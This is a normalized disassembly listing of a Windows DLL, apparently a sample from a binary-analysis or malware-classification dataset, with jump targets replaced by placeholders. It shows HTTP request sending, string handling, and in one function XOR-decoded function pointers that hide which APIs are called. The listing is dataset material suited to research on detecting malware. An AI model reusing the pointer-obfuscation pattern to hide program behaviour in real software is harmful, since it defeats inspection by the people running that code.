add ebx 0x24
xor esi esi
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov ecx [ ebp - 0x2a0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x2c8 ] 0x2
mov eax [ ebp - 0x2c4 ]
push eax
call sub_1000a86e
add esp 0x4
mov edi [ ebp - 0x2d0 ]
sub_10038620
push ebp
mov ebp esp
mov eax [ edi + 0x10 ]
push ebx
push esi
cmp eax 0x1
jb r-xdata
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
dec eax
cmp eax 0xffffffff
jbe r-xdata
mov ecx eax
or ecx 0xffffffff
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx edi
call sub_10063af0
cmp esi eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
push ecx
push esi
call sub_100021f0
add esp 0xc
test eax eax
je r-xdata
lea esi [ eax + ecx ]
mov eax [ ebp + 0x8 ]
mov bl [ eax ]
mov edi edi
dec esi
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ esi ] bl
jne r-xdata
mov eax esi
mov ecx edi
pop esi
sub eax ecx
pop ebx
pop ebp
retn 0x4
mov ecx [ edi ]
mov eax esi
pop esi
sub eax ecx
pop ebx
pop ebp
retn 0x4
sub_100386b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086c00
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x88 ] ecx
cmp eax ebx
jne r-xdata
mov ecx [ ecx ]
push ecx
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1003e780
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x1c ]
cmp eax 0xe
jae r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov esi 0x3
cmp eax esi
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov esi eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
push eax
push r--data
push ecx
call sub_100021f0
add esp 0xc
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov edi [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp edi 0x10
jb r-xdata
cmp esi 0x3
jb r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
xor eax eax
cmp esi 0x3
setne al
cmp eax ebx
je r-xdata
push 0x8
push 0x3
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x84 ] ebx
call sub_10028bd0
push eax
lea eax [ ebp - 0x48 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100282d0
add esp 0xc
mov esi 0x10
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] bl
cmp [ ebp - 0x34 ] esi
jae r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x84 ]
push edx
push 0x1
push eax
call [ StrToIntExA@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x48 ]
push 0x3
push 0xb
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100198e0
mov ebx eax
push 0x3
lea eax [ ebx + 0x4 ]
push eax
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100198e0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10003250
lea ecx [ ebp - 0x2c ]
call sub_10003250
mov eax 0x4
jmp r-xdata
push 0x4
add esi 0x3
push esi
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100198e0
cmp esi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10003250
lea ecx [ ebp - 0x2c ]
call sub_10003250
mov eax 0x5
jmp r-xdata
cmp eax esi
jae r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10003250
lea ecx [ ebp - 0x2c ]
call sub_10003250
mov eax 0x6
jmp r-xdata
sub eax esi
mov edi eax
push edi
push esi
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10028bd0
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x80 ]
mov esi 0x10
cmp [ ebp - 0x6c ] esi
jae r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10003250
lea ecx [ ebp - 0x2c ]
call sub_10003250
mov eax 0x7
jmp r-xdata
mov edx edi
call sub_10029d90
cmp eax [ ebp - 0x84 ]
je r-xdata
lea ecx [ ebp - 0x80 ]
cmp ebx 0xb
je r-xdata
lea ecx [ ebp - 0x80 ]
call sub_10003250
lea ecx [ ebp - 0x48 ]
call sub_10003250
lea ecx [ ebp - 0x2c ]
call sub_10003250
mov eax 0x8
jmp r-xdata
lea ecx [ ebp - 0x80 ]
call sub_10003250
lea ecx [ ebp - 0x48 ]
call sub_10003250
lea ecx [ ebp - 0x2c ]
call sub_10003250
xor eax eax
add ebx 0xfffffff5
push ebx
push 0xb
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_10028bd0
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
call sub_10071972
mov ecx [ ebp - 0x88 ]
mov [ ecx ] eax
add esp 0x4
lea ecx [ ebp - 0x64 ]
call sub_10003250
mov eax [ eax ]
sub_10038974
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov ecx 0xff10
cmp ax cx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
cmp ax cx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
lea edx [ ecx + 0xa ]
cmp ax dx
jae r-xdata
mov ecx 0x6f0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x966
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xc66
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xe50
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
mov ecx 0x1040
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x17e0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x30
cmp ax cx
jb r-xdata
add edx 0x30
jmp r-xdata
cmp ax dx
jb r-xdata
sub_10038b40
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100304a2
mov [ esi ] ax
add esi 0x2
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_10038b73
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10029567
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_10038bb0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10038bf1
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_10038cc3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
sar eax 0x1
sar esi 0x1
cmp esi eax
ja r-xdata
mov eax esi
pop esi
pop ebp
retn
lea ecx [ esi + esi ]
push ecx
push [ ebp + 0x10 ]
add eax eax
push eax
push [ ebp + 0x8 ]
call sub_1006d41a
add esp 0x10
sub_10038d00
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
xor edi edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov eax [ ebx ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x6e
call sub_1002f620
mov ecx [ esi ]
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x11f
call sub_1002f620
mov ecx [ esi + 0x8 ]
cmp ecx edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi ] edi
lea edx [ ebp - 0x2c ]
mov eax 0xc3
call sub_1002f620
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi + 0x8 ] edi
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x122
call sub_1002f620
mov [ esi + 0x10 ] eax
jmp r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0xc ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0xc ] edi
mov ecx [ ebx + 0xc ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x8f
call sub_1002f620
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x10 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x1c
call sub_1002f620
mov eax [ esi + 0x18 ]
cmp eax edi
je r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x14 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0xaa
call sub_1002f620
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x18 ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x18 ] edi
mov ecx [ ebx + 0x18 ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xb
call sub_1002f620
mov [ esi + 0x50 ] eax
inc [ eax + 0x1c ]
jmp r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x1c ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x1c ] edi
mov ecx [ ebx + 0x1c ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x4f
call sub_1002f620
mov [ ebp - 0x34 ] eax
mov eax [ ebx + 0x54 ]
cmp eax edi
je r-xdata
mov eax [ ebx + 0x20 ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x28 ]
mov [ esi + 0x28 ] ecx
mov eax [ ebx + 0x50 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x34 ]
xor ecx ebp
mov [ esi + 0x34 ] edx
mov eax esi
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x30 ]
cmp ecx edi
je r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ edx ]
push eax
lea eax [ esi + 0x54 ]
call sub_10001ba0
mov ecx [ ebp - 0x34 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
jne r-xdata
jmp r-xdata
push eax
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push edi
push ecx
push eax
mov [ esi + 0x30 ] eax
call sub_1007f580
add esp 0xc
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi + 0x30 ] edi
mov edx [ ebx + 0x38 ]
mov [ esi + 0x38 ] edx
mov eax [ ebx + 0x40 ]
mov [ esi + 0x40 ] eax
mov ecx [ ebx + 0x44 ]
mov [ esi + 0x44 ] ecx
mov edx [ ebx + 0x48 ]
mov [ esi + 0x48 ] edx
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4c ] eax
mov ecx [ ebx + 0x2c ]
mov [ esi + 0x2c ] ecx
mov edx [ ebx + 0x24 ]
mov [ esi + 0x24 ] edx
mov eax [ ebx + 0x30 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
sub_10039070
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
push eax
push ecx
push edx
call [ lstrlenW@IAT ]
mov ecx [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ecx
call [ HttpSendRequestW@IAT ]
pop esi
test eax eax
jne r-xdata
mov eax 0x1
pop ebp
retn 0x8
push eax
call sub_10023cc0
add esp 0x4
xor eax eax
pop ebp
retn 0x8
sub_100390c0
push ebp
mov ebp esp
push 0xffffffff
push sub_100892b6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ edi ] r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_10056d20
mov eax [ edi + 0x384 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ edi + 0x3a0 ]
mov [ ebp - 0x1c ] eax
cmp eax [ edi + 0x3a4 ]
je r-xdata
push eax
call [ FreeLibrary@IAT ]
mov eax [ edi + 0x3c0 ]
cmp eax esi
je r-xdata
mov ebx [ eax ]
mov [ ebp - 0x18 ] ebx
cmp ebx esi
je r-xdata
mov [ edi + 0x3c0 ] esi
mov [ edi + 0x3c4 ] esi
mov [ edi + 0x3c8 ] esi
mov eax [ edi + 0x3b0 ]
cmp eax esi
je r-xdata
push eax
call sub_1000a86e
add esp 0x4
add eax 0x4
mov [ ebp - 0x1c ] eax
cmp eax [ edi + 0x3a4 ]
jne r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax + 0x4 ]
lea edi [ ebx + 0x80 ]
mov [ ebp - 0x24 ] edi
mov [ ecx + edi - 0x60 ] r--data
test [ edi - 0x8 ] 0x1
lea esi [ edi - 0x48 ]
mov [ ebp - 0x28 ] esi
mov [ esi ] r--data
je r-xdata
mov [ edi + 0x3b0 ] esi
mov [ edi + 0x3b4 ] esi
mov [ edi + 0x3b8 ] esi
mov eax [ edi + 0x3a0 ]
cmp eax esi
je r-xdata
mov ebx [ edi + 0x3b4 ]
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x20 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x30 ]
mov [ edx ] 0x0
mov eax [ esi + 0x14 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x24 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x34 ]
mov [ edx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x6
mov eax [ esi + 0x38 ]
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ edx ]
push eax
call sub_1000a86e
add esp 0x4
mov [ edi + 0x3a0 ] esi
mov [ edi + 0x3a4 ] esi
mov [ edi + 0x3a8 ] esi
cmp [ edi + 0x34 ] 0x10
jb r-xdata
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ edi + 0x3b0 ]
push ecx
call sub_1000a86e
add esp 0x4
xor esi esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x5
call sub_100087a3
mov [ ebp - 0x4 ] 0x4
mov eax [ esi - 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + esi - 0x18 ] r--data
mov edx [ esi - 0x8 ]
mov eax [ edx + 0x4 ]
mov [ eax + esi - 0x8 ] r--data
mov ecx [ esi - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + esi - 0x18 ] r--data
push edi
mov [ edi ] r--data
call sub_10027450
add esp 0x4
mov [ ebp - 0x4 ] 0x3
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
test ecx ecx
je r-xdata
mov [ edi + 0x34 ] 0xf
mov [ edi + 0x30 ] esi
mov [ edi + 0x20 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi + 0x20 ]
push edx
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x24
cmp esi ebx
jne r-xdata
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebx + 0x18 ] 0x7
mov [ ebx + 0x14 ] 0x0
push ebx
mov [ ebx + 0x4 ] cx
call sub_1000a86e
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
add esp 0x4
xor esi esi
mov eax [ ebx + 0x4 ]
push eax
call sub_1000a86e
add esp 0x4
push eax
call sub_1000a86e
add esp 0x4
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_1000c927
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x4 ]
neg ebx
sbb ebx ebx
lea ecx [ ebp - 0x20 ]
not ebx
call sub_10003c9c
and ebx [ ebp - 0x10 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
mov ecx ebx
call edx
dec eax
mov [ ecx + 0x4 ] eax
sub_1003938d
push 0x3c
mov eax sub_10085747
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006b26d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000fdf6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10039450
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x28
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
mov [ esp + 0x18 ] ecx
mov ecx [ ebp + 0x10 ]
push esi
xor eax eax
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x18 ]
mov bl 0x38
push eax
mov [ esp + 0x2c ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x30 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x2
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_10039548
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov ebx ecx
mov eax [ ebx ]
push edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f5ef
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
